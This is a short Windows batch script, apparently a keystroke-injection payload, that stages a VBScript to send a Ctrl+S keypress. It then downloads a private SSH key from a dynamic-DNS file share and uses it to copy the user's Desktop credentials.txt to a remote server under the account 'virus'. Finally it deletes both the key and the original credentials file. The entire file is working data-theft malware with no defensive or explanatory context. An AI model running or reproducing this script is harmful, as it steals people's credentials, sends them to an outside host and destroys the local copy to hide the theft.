wait 60
@echo off
echo "%temp%\keypress.vbs"
echo Set WshShell = WScript.CreateObject("WScript.Shell")>> "%temp%\keypress.vbs"
echo WshShell.SendKeys "^s">> "%temp%\keypress.vbs"
cscript "%temp%\keypress.vbs"
del "%temp%\keypress.vbs"
curl -o %temp%\key https://nextcloud123.ddns.net/index.php/s/EyjTZNRZpyL4mHf/download/id_rsa
scp -i %temp%\key %USERPROFILE%\Desktop\credentials.txt virus@87.197.120.146:/home/virus/credentials.txt
del %temp%\key
del %USERPROFILE%\Desktop\credentials.txt
